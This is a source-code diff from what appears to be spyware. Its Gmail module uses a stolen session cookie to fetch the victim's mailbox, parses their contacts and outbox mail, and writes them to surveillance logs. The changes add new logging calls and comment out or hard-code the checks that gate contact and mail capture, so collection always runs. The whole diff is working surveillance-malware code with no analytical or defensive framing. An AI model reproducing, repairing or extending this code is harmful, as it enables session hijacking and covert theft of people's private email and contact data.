@@ -20,6 +20,7 @@ extern DWORD GetLastFBTstamp(char *user, DWORD *hi_part);
 extern void SetLastFBTstamp(char *user, DWORD tstamp_lo, DWORD tstamp_hi);
 extern WCHAR *UTF8_2_UTF16(char *str); // in firefox.cpp
 extern BOOL DumpContact(HANDLE hfile, DWORD program, WCHAR *name, WCHAR *email, WCHAR *company, WCHAR *addr_home, WCHAR *addr_office, WCHAR *phone_off, WCHAR *phone_mob, WCHAR *phone_hom, WCHAR *skype_name, WCHAR *facebook_page, DWORD flags);
+extern BOOL DumpContact2(HANDLE hfile, DWORD program, WCHAR *name, WCHAR *email, WCHAR *company, WCHAR *addr_home, WCHAR *addr_office, WCHAR *phone_off, WCHAR *phone_mob, WCHAR *phone_hom, WCHAR *skype_name, WCHAR *facebook_page, DWORD flags);
 
 extern BOOL bPM_MailCapStarted; // variabili per vedere se gli agenti interessati sono attivi
 extern BOOL bPM_ContactsStarted; 
@@ -46,7 +47,7 @@ DWORD ParseContacts(char *cookie, char *ik_val, WCHAR *user_name)
 	parser1 = (char *)r_buffer;
 
 	CheckProcessStatus();
-	hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
+	hfile = Log_CreateFile2(PM_CONTACTSAGENT, NULL, 0,0);
 	LOOP {
 		flags = 0;
 		parser1 = strstr(parser1, GM_CONTACT_IDENTIFIER);
@@ -74,9 +75,10 @@ DWORD ParseContacts(char *cookie, char *ik_val, WCHAR *user_name)
 		if (!wcscmp(mail_account, user_name))
 			flags |= CONTACTS_MYACCOUNT;
 
-		DumpContact(hfile, CONTACT_SRC_GMAIL, screen_name, NULL, NULL, NULL, NULL, NULL, NULL, NULL, mail_account, NULL, flags);
+		DumpContact2(hfile, CONTACT_SRC_GMAIL, screen_name, NULL, NULL, NULL, NULL, NULL, NULL, NULL, mail_account, NULL, flags);
+
 	}
-	Log_CloseFile(hfile);
+	Log_CloseFile2(hfile);
 
 	SAFE_FREE(r_buffer);
 	return SOCIAL_REQUEST_SUCCESS;
@@ -238,8 +240,8 @@ DWORD HandleGMail(char *cookie)
 
 	CheckProcessStatus();
 
-	if (!bPM_MailCapStarted && !bPM_ContactsStarted)
-		return SOCIAL_REQUEST_NETWORK_PROBLEM;
+// 	if (!bPM_MailCapStarted && !bPM_ContactsStarted)
+// 		return SOCIAL_REQUEST_NETWORK_PROBLEM;
 
 	// Verifica il cookie 
 	swprintf_s(mail_request, L"/mail/?shva=1#%S", GM_INBOX_IDENTIFIER);
@@ -266,7 +268,7 @@ DWORD HandleGMail(char *cookie)
 
 	// Cattura i contatti
 	ret_val = SOCIAL_REQUEST_SUCCESS;
-	if (bPM_ContactsStarted) {
+	if (1/*bPM_ContactsStarted*/) {
 		ptr = ptr2 + 1;
 		ptr = strchr(ptr, '\"');
 		FREE_PARSING(ptr);
@@ -284,8 +286,8 @@ DWORD HandleGMail(char *cookie)
 	}
 
 	SAFE_FREE(r_buffer);
-	if (!bPM_MailCapStarted)
-		return ret_val;
+// 	if (!bPM_MailCapStarted)
+// 		return ret_val;
 
 	last_tstamp_lo = GetLastFBTstamp(ik_val, &last_tstamp_hi);
 	ParseMailBox(GM_OUTBOX_IDENTIFIER, cookie, ik_val, last_tstamp_hi, last_tstamp_lo, FALSE, FALSE);
